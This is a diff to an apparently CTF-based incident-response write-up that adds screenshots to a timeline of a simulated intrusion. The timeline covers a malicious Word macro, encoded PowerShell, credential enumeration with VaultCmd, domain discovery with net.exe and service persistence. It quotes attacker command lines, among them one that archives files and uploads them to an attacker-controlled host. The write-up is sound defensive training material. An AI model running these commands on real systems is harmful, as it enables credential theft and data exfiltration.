@@ -25,11 +25,15 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
 *   **Process Chain:** `explorer.exe` -> `WINWORD.EXE` -> `powershell.exe`
 *   **IOC:** `C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm`
 
+![WINWORD.EXE executing the malicious document](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/1_winword_execution.png)
+
 ### 2. Execution & Defense Evasion
 *   **Timestamp:** `2026-10-23 12:02:44`
 *   **Event:** Word spawned a hidden PowerShell process (`ProcessId: 8572`). The command line used Base64 encoding (`-Enc`) and hidden flags (`-NoP -W Hidden`) to evade detection.
 *   **Decoded Payload:** The Base64 string revealed a download-and-execute stager pulling `svchost_update.ps1` from the malicious domain `paylink-cdn.thm`.
 *   **IOC:** `powershell.exe -NoP -W Hidden -Enc [Base64 String]`
+
+![PowerShell execution with encoded command](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/2_payload_execution.png)
 
 ### 3. Command and Control (C2)
 *   **Timestamp:** `2026-10-23 12:02:47`
@@ -41,6 +45,8 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
 *   **Event:** The attacker used the legitimate Windows utility `VaultCmd.exe` to enumerate stored credentials from the Windows Credential Manager. This was done to obtain credentials for lateral movement.
 *   **IOC:** `"C:\Windows\Sysnative\vaultcmd.exe" "/listcreds:Windows Credentials"`
 
+![VaultCmd credential enumeration](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/4_Credential%20Access.png)
+
 ### 5. Discovery (Network Enumeration)
 *   **Timestamp:** `2026-10-23 12:07:48`
 *   **Event:** The attacker executed multiple `net.exe` commands to map the Active Directory environment:
@@ -48,6 +54,10 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
     *   `net.exe group "Domain Admins" /domain` (Identify high-value targets)
     *   `net.exe use \\THM-SREYES\C$` (Attempt lateral movement to an admin share)
 *   **IOC:** `net.exe` commands targeting `THM-SREYES`.
+
+![Net group Domain Admins enumeration](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/5_discovery_Domain%20Admins.png)
+![Net use admin share C$](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/5_discovery_THM-SREYES_C%24.png)
+![Net user domain enumeration](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/5_discovery_domain.png)
 
 ### 6. Persistence (Service Creation & Scheduled Task)
 *   **Timestamp:** `2026-10-23 12:10:18` (Service) & `12:17:41` (Scheduled Task)
@@ -58,6 +68,8 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
     *   Service Name: `SvcUpdate`
     *   Service File: `C:\Windows\Temp\svchost_update.ps1`
     *   Compromised Account (used to create service): `svc-mktshare` (Logon ID: `0x24F6572`)
+
+![Windows Service Creation for Persistence](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/6_Persistence.png)
 
 ### 7. Data Staging & Exfiltration (Game Source Code)
 *   **Timestamp:** `2026-10-23 09:07:27`
@@ -80,6 +92,10 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
     *   Command Line: `"powershell.exe" -NoProfile -WindowStyle Hidden -Command "& "7z.exe" a "C:\ProgramData\CrashReports\crashlogs.7z" "C:\ProgramData\CrashReports\*.log"; Invoke-RestMethod -Uri "https://telemetry-vendor.thm/upload" ..."`
     *   Exfiltration URL: `https://telemetry-vendor.thm/upload`
     *   Destination IP: `104.18.32.47`
+
+![Crash logs exfiltration via Invoke-RestMethod](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/7_Crash%20Logs.png)
+![Data staging of the game source code](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/7_Data%20Staging.png)
+![Exfiltration of the game source code archive](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/7_game%20source%20code.png)
 
 ---
 
